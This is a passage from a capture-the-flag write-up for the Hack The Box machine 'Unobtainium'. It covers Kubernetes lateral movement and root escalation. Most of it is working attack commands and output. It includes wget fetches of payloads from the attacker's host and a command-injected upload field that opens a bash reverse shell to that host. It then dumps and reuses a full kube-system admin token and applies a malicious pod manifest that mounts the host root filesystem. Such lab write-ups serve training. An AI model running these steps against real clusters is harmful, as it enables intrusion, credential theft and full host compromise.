        Image ID:       docker-pullable://localhost:5000/node_server@sha256:f3bfd2fc13c7377a380e018279c6e9b647082ca590600672ff787e1bb918e37c
        Port:           3000/TCP
        Host Port:      0/TCP
        State:          Running
          Started:      Thu, 26 Aug 2021 08:25:19 +0000
        Last State:     Terminated
          Reason:       Error
          Exit Code:    137
          Started:      Mon, 26 Jul 2021 15:00:22 +0000
          Finished:     Mon, 26 Jul 2021 15:04:55 +0000
        Ready:          True
        Restart Count:  30
        Environment:    <none>
        Mounts:
          /var/run/secrets/kubernetes.io/serviceaccount from default-token-rmcd6 (ro)
    Conditions:
      Type              Status
      Initialized       True
      Ready             True
      ContainersReady   True
      PodScheduled      True
    Volumes:
      default-token-rmcd6:
        Type:        Secret (a volume populated by a Secret)
        SecretName:  default-token-rmcd6
        Optional:    false
    QoS Class:       BestEffort
    Node-Selectors:  <none>
    Tolerations:     node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
                     node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
    Events:          <none>

We can see the location of the image (localhost:5000/node_server), the running port (3000/TCP) and IP address (172.17.0.6).
With all this information, we should investigate if it's possible to create a new, malicious, pod or even move laterally to
another pod using Kubernetes API auth module:

  root@webapp-deployment-5d764566f4-h5zhw:/tmp# ./kubectl auth can-i exec pods
    no


3. So kubectl is not the way.. maybe we can access the dev-pods some other way.
If we curl a dev-pod the response looks very much like our initials curls when probing the front-end.

  root@webapp-deployment-5d764566f4-mbprj:/tmp# curl -v http://172.17.0.6:3000
    * Rebuilt URL to: http://172.17.0.6:3000/
    *   Trying 172.17.0.6...
    * TCP_NODELAY set
      % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                     Dload  Upload   Total   Spent    Left  Speed
      0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Connected to 172.17.0.6 (172.17.0.6) port 3000 (#0)
    > GET / HTTP/1.1
    > Host: 172.17.0.6:3000
    > User-Agent: curl/7.52.1
    > Accept: */*
    >
    < HTTP/1.1 200 OK
    < X-Powered-By: Express
    < Content-Type: application/json; charset=utf-8
    < Content-Length: 2
    < ETag: W/"2-l9Fw4VUO7kr8CvBlt4zaMCqXZ0w"
    < Date: Thu, 26 Aug 2021 13:06:28 GMT
    < Connection: keep-alive
    < Keep-Alive: timeout=5
    <
    { [2 bytes data]
    * Curl_http_done: called premature == 0
    100     2  100     2    0     0    859      0 --:--:-- --:--:-- --:--:--  1000
    * Connection #0 to host 172.17.0.6 left intact

Maybe we can re-use the same exploit to get  access to the dev-pods as well?
Upload the cURL data-files (with new reverse port) and attack the dev-pod!

  root@webapp-deployment-5d764566f4-mbprj:/usr/src/app# wget http://10.10.14.2:4499/user-upload.json
  root@webapp-deployment-5d764566f4-mbprj:/usr/src/app# wget http://10.10.14.2:4499/user-reverse.json

  root@webapp-deployment-5d764566f4-mbprj:/tmp# curl -v -X PUT 172.17.0.6:3000 -H "Content-Type: application/json" -d "@user-upload.json"
    ..
    > PUT / HTTP/1.1
    > Host: 172.17.0.6:3000
    < HTTP/1.1 200 OK
    ..
    {"ok":true}

  root@webapp-deployment-5d764566f4-mbprj:/tmp# curl -v -X POST 172.17.0.6:3000/upload -H "Content-Type: application/json" -d "@user-reverse.json"
    ..
    > POST /upload HTTP/1.1
    > Host: 172.17.0.6:3000
    < HTTP/1.1 200 OK
    ..
    {"ok":true,"Uploaded_File":"$(/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/4400 0>&1')"}

  [root:/git/htb/unobtainium]# nc -lvnp 4400                                                                                        (master✱)
    listening on [any] 4400 ...
    connect to [10.10.14.2] from (UNKNOWN) [10.10.10.235] 41198
    bash: cannot set terminal process group (1): Inappropriate ioctl for device
    bash: no job control in this shell
    root@devnode-deployment-cd86fb5c-6ms8d:/usr/src/app# id && hostname
      uid=0(root) gid=0(root) groups=0(root)
      devnode-deployment-cd86fb5c-6ms8d


4. We successfully moved laterally and got access to the devnode! Redo our steps with kubectl and see if we can create a malicious pod now.

root@devnode-deployment-cd86fb5c-6ms8d:/tmp# wget http://10.10.14.2:4499/kubectl
root@devnode-deployment-cd86fb5c-6ms8d:/tmp# install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl

However, none of the previous steps work:

root@devnode-deployment-cd86fb5c-6ms8d:/tmp# ./kubectl get namespaces
  Error from server (Forbidden): namespaces is forbidden: User "system:serviceaccount:dev:default" cannot list resource "namespaces" in API group "" at the cluster scope
root@devnode-deployment-cd86fb5c-6ms8d:/tmp# ./kubectl get pods
  Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:dev:default" cannot list resource "pods" in API group "" in the namespace "dev"

From the webapp-pod we found several move namespaces, trying to get pods from each of them doesn't work, neither can we exec pods:
  root@devnode-deployment-cd86fb5c-6ms8d:/tmp# ./kubectl auth can-i exec pods
    no

After some random testing I came across this:
root@devnode-deployment-cd86fb5c-6ms8d:/tmp# kubectl auth can-i list secrets -n kube-system
  yes

root@devnode-deployment-cd86fb5c-6ms8d:/tmp# ./kubectl get secrets -n kube-system
  NAME                                             TYPE                                  DATA   AGE
  attachdetach-controller-token-5dkkr              kubernetes.io/service-account-token   3      221d
  bootstrap-signer-token-xl4lg                     kubernetes.io/service-account-token   3      221d
  c-admin-token-tfmp2                              kubernetes.io/service-account-token   3      220d
  certificate-controller-token-thnxw               kubernetes.io/service-account-token   3      221d
  clusterrole-aggregation-controller-token-scx4p   kubernetes.io/service-account-token   3      221d
  coredns-token-dbp92                              kubernetes.io/service-account-token   3      221d
  cronjob-controller-token-chrl7                   kubernetes.io/service-account-token   3      221d
  daemon-set-controller-token-cb825                kubernetes.io/service-account-token   3      221d
  default-token-l85f2                              kubernetes.io/service-account-token   3      221d
  deployment-controller-token-cwgst                kubernetes.io/service-account-token   3      221d
  disruption-controller-token-kpx2x                kubernetes.io/service-account-token   3      221d
  endpoint-controller-token-2jzkv                  kubernetes.io/service-account-token   3      221d
  endpointslice-controller-token-w4hwg             kubernetes.io/service-account-token   3      221d
  endpointslicemirroring-controller-token-9qvzz    kubernetes.io/service-account-token   3      221d
  expand-controller-token-sc9fw                    kubernetes.io/service-account-token   3      221d
  generic-garbage-collector-token-2hng4            kubernetes.io/service-account-token   3      221d
  horizontal-pod-autoscaler-token-6zhfs            kubernetes.io/service-account-token   3      221d
  job-controller-token-h6kg8                       kubernetes.io/service-account-token   3      221d
  kube-proxy-token-jc8kn                           kubernetes.io/service-account-token   3      221d
  namespace-controller-token-2klzl                 kubernetes.io/service-account-token   3      221d
  node-controller-token-k6p6v                      kubernetes.io/service-account-token   3      221d
  persistent-volume-binder-token-fd292             kubernetes.io/service-account-token   3      221d
  pod-garbage-collector-token-bjmrd                kubernetes.io/service-account-token   3      221d
  pv-protection-controller-token-9669w             kubernetes.io/service-account-token   3      221d
  pvc-protection-controller-token-w8m9r            kubernetes.io/service-account-token   3      221d
  replicaset-controller-token-bzbt8                kubernetes.io/service-account-token   3      221d
  replication-controller-token-jz8k8               kubernetes.io/service-account-token   3      221d
  resourcequota-controller-token-wg7rr             kubernetes.io/service-account-token   3      221d
  root-ca-cert-publisher-token-cnl86               kubernetes.io/service-account-token   3      221d
  service-account-controller-token-44bfm           kubernetes.io/service-account-token   3      221d
  service-controller-token-pzjnq                   kubernetes.io/service-account-token   3      221d
  statefulset-controller-token-z2nsd               kubernetes.io/service-account-token   3      221d
  storage-provisioner-token-tk5k5                  kubernetes.io/service-account-token   3      221d
  token-cleaner-token-wjvf9                        kubernetes.io/service-account-token   3      221d
  ttl-controller-token-z87px                       kubernetes.io/service-account-token   3      221d

I have no clue of what to do with all these secrets, however we can see that one of them have a shorter age (220d) and the name
seems very interesting: c-admin-token-tfmp2. Lets look at it!

root@devnode-deployment-cd86fb5c-6ms8d:/tmp# ./kubectl describe secrets/c-admin-token-tfmp2 -n kube-system
  Name:         c-admin-token-tfmp2
  Namespace:    kube-system
  Labels:       <none>
  Annotations:  kubernetes.io/service-account.name: c-admin
                kubernetes.io/service-account.uid: 2463505f-983e-45bd-91f7-cd59bfe066d0

  Type:  kubernetes.io/service-account-token

  Data
  ====
  token:      eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow
  ca.crt:     1066 bytes
  namespace:  11 bytes


5. The next obvious step forward is to use this admin token to gather more information. Reading on kubernetes.io i find:
  > "When using kubectl, use your id_token with the --token flag or add it directly to your kubeconfig"

To  make the output a bit clearner, lets write the token to a variable and use that instead.
  root@devnode-deployment-cd86fb5c-6ms8d:/tmp# export TOKEN=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpOdm9iX1ZETEJ2QlZFaVpCeHB6TjBvaWNEalltaE1ULXdCNWYtb2JWUzgifQ.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Iiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9uYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsImt1YmVybmV0ZXMuaW8vc2VydmljZWFjY291bnQvc2VjcmV0Lm5hbWUiOiJjLWFkbWluLXRva2VuLXRmbXAyIiwia3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC9zZXJ2aWNlLWFjY291bnQubmFtZSI6ImMtYWRtaW4iLCJrdWJlcm5ldGVzLmlvL3NlcnZpY2VhY2NvdW50L3NlcnZpY2UtYWNjb3VudC51aWQiOiIyNDYzNTA1Zi05ODNlLTQ1YmQtOTFmNy1jZDU5YmZlMDY2ZDAiLCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06Yy1hZG1pbiJ9.Xk96pdC8wnBuIOm4Cgud9Q7zpoUNHICg7QAZY9EVCeAUIzh6rvfZJeaHucMiq8cm93zKmwHT-jVbAQyNfaUuaXmuek5TBdY94kMD5A_owFh-0kRUjNFOSr3noQ8XF_xnWmdX98mKMF-QxOZKCJxkbnLLd_h-P2hWRkfY8xq6-eUP8MYrYF_gs7Xm264A22hrVZxTb2jZjUj7LTFRchb7bJ1LWXSIqOV2BmU9TKFQJYCZ743abeVB7YvNwPHXcOtLEoCs03hvEBtOse2POzN54pK8Lyq_XGFJN0yTJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow
    <TJuuQQLtwroF3579DBbZUkd4JBQQYrpm6Wdm9tjbOyGL9KRsNow

Lets try a simple POC if we can gather more information now with the use of the admin token.
Previously we wasn't able to get namespace information, however now we are!
  root@devnode-deployment-cd86fb5c-6ms8d:/tmp# ./kubectl --token=$TOKEN get namespaces
    <6ms8d:/tmp# ./kubectl --token=$TOKEN get namespaces
    NAME              STATUS   AGE
    default           Active   221d
    dev               Active   220d
    kube-node-lease   Active   221d
    kube-public       Active   221d
    kube-system       Active   221d

  root@devnode-deployment-cd86fb5c-6ms8d:/tmp# ./kubectl --token=$TOKEN auth can-i exec pods
    yes

Now we are able to exec pods, which probably means we'll be able to get root.txt.


6. Create an malicious attacker.yaml file to escalate privilege with.

  [root:/git/htb/unobtainium]# cat attacker.yaml                                                                                    (master✱)
    apiVersion: v1
    kind: Pod
    metadata:
      labels:
        run: attacker-pod
      name: attacker-pod
      namespace: default
    spec:
      volumes:
      - name: host-fs
        hostPath:
          path: /
      containers:
      - image: localhost:5000/node_server
        imagePullPolicy: Always
        name: attacker-pod
        volumeMounts:
          - name: host-fs
            mountPath: /root
      restartPolicy: Never

  root@devnode-deployment-cd86fb5c-6ms8d:/tmp# wget http://10.10.14.2:4499/attacker.yaml
  root@devnode-deployment-cd86fb5c-6ms8d:/tmp# ./kubectl --token=$TOKEN apply -f attacker.yaml
    pod/attacker-pod created
  root@devnode-deployment-cd86fb5c-6ms8d:/tmp# ./kubectl --token=$TOKEN exec -it attacker-pod -n default -- bash
    Unable to use a TTY - input is not a terminal or the right kind of file
    id && hostname
      uid=0(root) gid=0(root) groups=0(root)
      attacker-pod
    cat root.txt
      59538ae4da62a3871d1cb220284bcda6


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝


Prototype Pollution:
  https://blog.0daylabs.com/2019/02/15/prototype-pollution-javascript/
  https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution

Bash Variable Substitution:
  https://unix.stackexchange.com/questions/312702/bash-variable-substitution-in-a-json-string

Install kubectl:
  https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux

Kubernetes kubectl commands:
  https://book.hacktricks.xyz/pentesting/pentesting-kubernetes/enumeration-from-a-pod
  https://kubernetes.io/docs/reference/access-authn-authz/authorization/
  https://book.hacktricks.xyz/pentesting/pentesting-kubernetes

Kubectl token:
  https://kubernetes.io/docs/reference/access-authn-authz/authentication/
